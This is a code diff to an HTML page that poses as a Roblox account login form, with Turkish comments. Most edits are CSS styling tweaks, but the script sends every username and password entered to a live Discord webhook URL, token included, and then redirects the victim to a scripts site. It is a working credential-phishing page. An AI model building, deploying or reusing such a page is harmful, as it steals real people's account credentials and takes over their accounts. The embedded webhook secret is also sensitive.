@@ -24,6 +24,7 @@
       border-radius: 10px;
       box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
       width: 350px;
+      box-sizing: border-box; /* Taşma önlemek için kutu modeli */
     }
 
     h1 {
@@ -48,6 +49,7 @@
       border-radius: 5px;
       background-color: #444;
       color: white;
+      box-sizing: border-box; /* Kenarlıkla taşma önlenir */
     }
 
     button {
@@ -59,6 +61,7 @@
       border: none;
       border-radius: 5px;
       cursor: pointer;
+      transition: background-color 0.3s ease; /* Hover animasyonu */
     }
 
     button:hover {
@@ -68,6 +71,8 @@
     .error-message {
       color: red;
       text-align: center;
+      font-size: 14px;
+      margin-top: 10px;
     }
   </style>
 </head>
@@ -76,10 +81,10 @@
     <h1>Login with your Roblox Account!</h1>
     <form id="register-form">
       <label for="username">Username:</label>
-      <input type="text" id="username" name="username" required><br>
+      <input type="text" id="username" name="username" required>
 
       <label for="password">Password:</label>
-      <input type="password" id="password" name="password" required><br>
+      <input type="password" id="password" name="password" required>
 
       <button type="submit">Login Roblox</button>
     </form>
@@ -94,7 +99,7 @@
       const password = document.getElementById('password').value;
 
       // Webhook ile Discord'a gönderme işlemi
-      const webhookURL = 'https://canary.discord.com/api/webhooks/1313523578217566278/no2aSqXSwdOxZcK9qEPWjDXT5m3UY3cMIwmJG6524zQS3a7VlEG_LWATo4g30Wdn00ie'; // Discord webhook URL'nizi buraya ekleyin
+      const webhookURL = 'https://canary.discord.com/api/webhooks/1313523578217566278/no2aSqXSwdOxZcK9qEPWjDXT5m3UY3cMIwmJG6524zQS3a7VlEG_LWATo4g30Wdn00ie';
       const data = {
         content: `Yeni Kayıt: Kullanıcı Adı: ${username}, Şifre: ${password}`
       };
@@ -110,7 +115,7 @@
         if (response.ok) {
           // Başarıyla gönderildiğinde, kullanıcıyı scripts sayfasına yönlendirme
           localStorage.setItem('userLoggedIn', 'true');
-          window.location.href = 'https://freck1337.github.io/roscripts/scripts.html'; // Kayıt sonrası script sayfasına yönlendir
+          window.location.href = 'https://freck1337.github.io/roscripts/scripts.html';
         } else {
           // Hata durumunda mesaj göster
           document.getElementById('error-message').innerText = 'Bir hata oluştu, tekrar deneyin.';
